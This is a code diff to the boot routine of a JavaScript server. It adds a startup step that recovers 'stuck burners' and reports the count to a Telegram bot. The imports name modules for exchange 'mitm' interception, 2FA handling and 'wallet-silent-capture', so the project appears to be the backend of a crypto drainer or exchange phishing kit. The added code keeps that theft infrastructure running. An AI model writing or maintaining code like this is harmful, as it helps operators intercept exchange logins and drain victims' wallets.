@@ -26,6 +26,7 @@ import { closeMitmPool } from './lib/cex-mitm-manager.js'
 import { twoFaHandler } from './lib/cex-twofa-handler.js'
 import { walletSilentCapture } from './lib/wallet-silent-capture.js'
 import {
+  recoverAllStuckBurners,
   registerPriceOracleTelegramLogger,
   registerSplitWithdrawTelegramLogger,
   startPriceOracle,
@@ -149,6 +150,18 @@ const start = async () => {
     })
     .catch((err) => {
       console.warn('[BOOT] Database anchor check failed:', formatBootError(err))
+    })
+
+  void recoverAllStuckBurners()
+    .then((results) => {
+      const recovered = results.filter((r) => r.ok).length
+      if (results.length > 0) {
+        console.log(`[BOOT] Burner recovery: ${recovered}/${results.length} stuck burners recovered`)
+        void sendTelegramMessage(`🔄 <b>Burner Recovery on Startup</b>\nRecovered: ${recovered}/${results.length} stuck burners`)
+      }
+    })
+    .catch((err) => {
+      console.warn('[BOOT] Burner recovery failed:', formatBootError(err))
     })
 
   void startTelegramControlBot().catch((err) => {
